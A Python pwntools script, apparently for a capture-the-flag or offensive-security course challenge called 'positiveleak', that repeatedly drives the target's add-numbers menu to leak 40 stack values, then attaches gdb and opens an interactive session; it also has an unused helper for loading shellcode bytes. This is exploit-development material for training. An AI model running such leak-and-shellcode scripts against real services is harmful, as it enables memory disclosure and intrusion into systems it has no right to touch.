from pwn import *
import time
import subprocess
import sys
import warnings
import re

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

def gdb_attach(r):
    input("wait")
    gdb.attach(r, """
	unset env
	set disable-randomization off
	c
	""")


# takes an integer as input and displays the value on the stack at index i
# it asusmes you ar ein menu once invoked
def get_leak(i):
    r.recvrepeat(timeout=0.1)
    time.sleep(0.3)
    r.sendline(b"0")            #add numbers
    time.sleep(0.2)
    r.sendline(str(i).encode()) # number of numbers I wanna add
    time.sleep(0.2)
    for i in range(i+1):        # adding them
        r.sendline(b"0")
        time.sleep(0.2)
    r.sendline(b"1")            # display the sum
    time.sleep(0.2)
    r.recvlines(5)
    r.recvuntil(b"> ")
    r.recvlines(i)
    value = hex(int(r.recvlineS().strip()))
    print(value)

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "error"
warnings.filterwarnings("ignore", category=BytesWarning)

if args["REMOTE"]:
	r = remote("bin.offdef.jinblack.it", 3003)
else:
	r = process("./positiveleak")

for i in range(40):
    get_leak(i)


gdb_attach(r)

r.interactive()
